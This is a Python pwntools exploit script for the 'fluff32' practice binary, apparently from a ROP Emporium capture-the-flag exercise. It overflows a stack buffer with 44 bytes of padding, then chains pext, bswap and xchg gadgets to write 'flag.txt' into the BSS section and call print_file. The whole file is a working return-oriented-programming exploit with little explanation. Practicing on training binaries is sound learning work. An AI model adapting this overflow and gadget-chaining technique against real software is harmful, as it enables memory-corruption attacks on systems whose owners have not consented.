from pwn import *

exe = ELF("./fluff32", checksec=False)
p = process(exe.path)

file_char = [0x66, 0x6c, 0x61, 0x67, 0x2e, 0x74, 0x78, 0x74]
rbx_val = []
BSS_ADDR = exe.bss()

# gadget
MOV_EAX_VAL = 0x0804854f      #mov eax, 0xdeadbeef; ret; 
POP_EBX = 0x08048399          #pop ebx; ret
PEXT_EDX_EBX_EAX = 0x0804854a #pext edx, ebx, eax; ret; 
XCHG_ECX_EDX = 0x08048555     #xchg byte ptr [ecx], dl; ret; 
POP_BSWAP_ECX = 0x08048558    #pop ecx; bswap ecx; ret; 
file = b'flag.txt'

payload = b'A' * 44

# 0xdeadbeef = 0b11011110101011011011111011101111
def getrbx(val):
    rbx = 0x0

    j = 0
    for i in range(32):
        if (0xdeadbeef >> i) & 1 == 1:
            if j < 8:
                if (val >> j) & 1 == 1:
                    rbx |= (1 << i)
                j += 1
    return rbx

def bswap32(x):
    # đảo 4 byte: 0xAABBCCDD -> 0xDDCCBBAA
    return ((x & 0x000000FF) << 24) | \
           ((x & 0x0000FF00) << 8)  | \
           ((x & 0x00FF0000) >> 8)  | \
           ((x & 0xFF000000) >> 24)

# print(hex(getrbx(0x66))) #test getrbx function

for i in range(len(file)):
    payload += p32(MOV_EAX_VAL)
    payload += p32(POP_EBX)
    payload += p32(getrbx(file_char[i]))
    payload += p32(PEXT_EDX_EBX_EAX)
    payload += p32(POP_BSWAP_ECX)
    payload += p32(bswap32(BSS_ADDR + i + 1))
    payload += p32(XCHG_ECX_EDX)

payload += p32(exe.symbols['print_file'])
payload += p32(0xdeadbeef)
payload += p32(BSS_ADDR + 1)

p.sendlineafter('>', payload)

output = p.recvall().decode(errors="ignore")
print(output)